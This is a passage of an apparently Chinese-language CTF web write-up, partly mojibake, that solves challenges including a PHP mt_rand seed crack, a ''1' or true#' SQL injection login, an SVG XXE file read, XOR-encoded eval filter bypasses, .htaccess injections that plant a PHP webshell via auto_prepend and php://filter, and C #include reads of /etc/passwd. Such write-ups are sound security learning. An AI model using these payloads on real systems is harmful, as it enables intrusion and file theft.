</span></span><span class="line"><span class="cl">            <span class="n">res</span><span class="o">+=</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="s1">&#39;0&#39;</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str1</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39; &#39;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åæ ¹æ®é¢˜ç›®é€»è¾‘ç®—ç§é’¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">mt_srand</span><span class="p">(</span><span class="mi">1775196155</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//å…¬é’¥
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">public_key</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">16</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$strings1</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$public_key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$public_key</span> <span class="o">.=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$strings1</span><span class="p">,</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$strings1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$public_key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">//ç§é’¥
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">private_key</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">12</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$strings2</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$private_key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$private_key</span> <span class="o">.=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$strings2</span><span class="p">,</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$strings2</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$private_key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">public_key</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">private_key</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç‰ˆæœ¬è¦æ˜¯å‰ä¸‹ç®—ç§å­çš„ç‰ˆæœ¬</p>
<p>ç„¶åä¸‡èƒ½å¯†ç ç™»å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">crispr
</span></span><span class="line"><span class="cl">1&#39; or true#
</span></span><span class="line"><span class="cl">XuNhoueCDCGc
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bsidescf-2019svgmagic">[BSidesCF 2019]SVGMagic
</h2><p>åˆ©ç”¨svgæ ‡ç­¾æ¥è¯»flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE note [
</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY file SYSTEM &#34;file:///proc/self/cwd/flag.txt&#34; &gt;</span>
</span></span><span class="line"><span class="cl">]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;svg</span> <span class="na">height=</span><span class="s">&#34;200&#34;</span> <span class="na">width=</span><span class="s">&#34;1000&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;text</span> <span class="na">x=</span><span class="s">&#34;10&#34;</span> <span class="na">y=</span><span class="s">&#34;20&#34;</span><span class="nt">&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/text&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/svg&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>/proc/self/cwdè¡¨ç¤ºå½“å‰ç›®å½•ä¸‹è¿è¡Œçš„æ–‡ä»¶</p>
<h2 id="isitdtu-2019easyphp">[ISITDTU 2019]EasyPHP
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$_</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[\x00- 0-9\&#39;&#34;`$&amp;.,|[{_defgops\x7F]+/i&#39;</span><span class="p">,</span> <span class="nv">$_</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;rosÃ© will not do it&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">strlen</span><span class="p">(</span><span class="nx">count_chars</span><span class="p">(</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$_</span><span class="p">),</span> <span class="mh">0x3</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mh">0xd</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;you are so close, omg&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\x00- 0-9                       åŒ¹é…\x00åˆ°ç©ºæ ¼(\x20)ï¼Œ0-9çš„æ•°å­—
</span></span><span class="line"><span class="cl">&#39;&#34;`$&amp;.,|[{_defgops              åŒ¹é…è¿™äº›å­—ç¬¦
</span></span><span class="line"><span class="cl">\x7F                            åŒ¹é…DEL(\x7F)å­—ç¬¦
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸‹é¢è¿™ä¸ªä¼šç»Ÿè®¡ç”¨è¿‡çš„ä¸åŒå­—ç¬¦ï¼Œè¶…è¿‡13ä¸ªè¢«waf</p>
<p>åˆ©ç”¨å­—ç¬¦ä¸²å¼‚æˆ–</p>
<p>å…ˆç¡®å®šè‡ªå·±æƒ³æ‰§è¡Œçš„è¯­å¥ï¼Œæ¯”å¦‚phpinfoï¼Œç„¶åå®šä¸€ä¸ªå‚è€ƒå­—ç¬¦ä¸²ï¼Œè®©phpinfoå’Œå®ƒå¼‚æˆ–ï¼Œå°±å¯ä»¥å¾—åˆ°æƒ³è¦çš„è¾“å…¥ï¼Œå¦‚æœå¾—åˆ°çš„ç»“æœä¸ç¬¦åˆè¦æ±‚ï¼Œå†å¾®è°ƒå‚è€ƒå­—ç¬¦ä¸²</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">p:%8f^%ff
</span></span><span class="line"><span class="cl">h:%97^%ff
</span></span><span class="line"><span class="cl">i:%96^%ff
</span></span><span class="line"><span class="cl">n:%91^%ff
</span></span><span class="line"><span class="cl">f:%99^%ff
</span></span><span class="line"><span class="cl">o:%90^%ff
</span></span></code></pre></td></tr></table>
</div>
</div><p>è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;phpinfo&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">standard</span> <span class="o">=</span> <span class="mh">0xff</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">dicts</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">dicts</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">^</span><span class="n">standard</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span><span class="s1">&#39;%&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">res</span><span class="o">+</span><span class="n">dicts</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">+</span><span class="s1">&#39;^&#39;</span><span class="o">+</span><span class="s2">&#34;</span><span class="si">%f</span><span class="s2">f&#34;</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">res</span><span class="o">+</span><span class="s1">&#39;^&#39;</span><span class="o">+</span><span class="s2">&#34;</span><span class="si">%f</span><span class="s2">f&#34;</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">target</span><span class="p">))))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print_r(scandir(&#39;.&#39;))
</span></span><span class="line"><span class="cl">(%8f%8d%96%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff)((%8c%9c%9e%91%9b%96%8d^%ff%ff%ff%ff%ff%ff%ff)((%d1^%ff)));
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¦æ‰¾åˆ°å¯ä»¥æ›¿æ¢çš„ï¼Œå³åœ¨å†…éƒ¨å¯ä»¥äº’ç›¸å¼‚æˆ–å‡ºæ¥çš„ï¼Œæ‰èƒ½ä½¿é‡å¤çš„å˜å°‘</p>
<p>æœ€å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print_r(scandir(&#39;.&#39;))
</span></span><span class="line"><span class="cl">(%8f%8d%9c%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff^%ff%ff%9b%ff%ff%ff%ff^%ff%ff%91%ff%ff%ff%ff)((%9c%9c%8d%91%9b%9c%8d^%ff%ff%ff%ff%ff%ff%ff^%9b%ff%9c%ff%ff%9b%ff^%8b%ff%8f%ff%ff%91%ff)((%d1^%ff)));
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">readfile(end(scandir(&#39;.&#39;)))
</span></span><span class="line"><span class="cl">((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF)));
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ç¾ŠåŸæ¯2020easyphp">[ç¾ŠåŸæ¯2020]easyphp
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;on&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;html&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;type&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;upload&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[^a-z\.]/&#34;</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Hello, world&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œåˆ©ç”¨åˆ°ä¹‹å‰å­¦ä¹ hatccessæ–‡ä»¶çš„ä½œç”¨ï¼ŒåŒ…å«index.php,åæ–œæ ç»•è¿‡æ­£åˆ™</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_prepend_fi\
</span></span><span class="line"><span class="cl">le .htaccess
</span></span><span class="line"><span class="cl">#&lt;?php system(&#39;ls /&#39;);?&gt;\
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¢è¡Œç”¨urlç¼–ç ä¸€ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20.htaccess%0A%23%3C?php%20system(&#39;ls%20/&#39;);?%3E\
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ–è€…åˆ©ç”¨ä¸Šæ¬¡å­¦åˆ°çš„.htaccessæ–‡ä»¶ç»•è¿‡prceé™åˆ¶çš„æ–¹æ³•å†™é©¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value pcre.backtrack_limit 0
</span></span><span class="line"><span class="cl">php_value pcre.jit 0
</span></span><span class="line"><span class="cl"># \
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;f ilename=.htaccess
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?filename=php://filter/write=convert.base64-decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs/Plw&amp;1=phpinfo();
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="fireshellctf2020caas">[FireshellCTF2020]Caas
</h2><p>cè¯­è¨€ç¼–è¯‘æŠ¥é”™</p>
<p>åˆ©ç”¨#includeæ¥æ–‡ä»¶åŒ…å«</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#include &#34;/etc/passwd&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›´æ¥åŒ…å«flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#include &#34;/flag&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="harekazectf2019avatar-uploader-1">[HarekazeCTF2019]Avatar Uploader 1
</h2><p>åŸé¢˜ç»™äº†æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
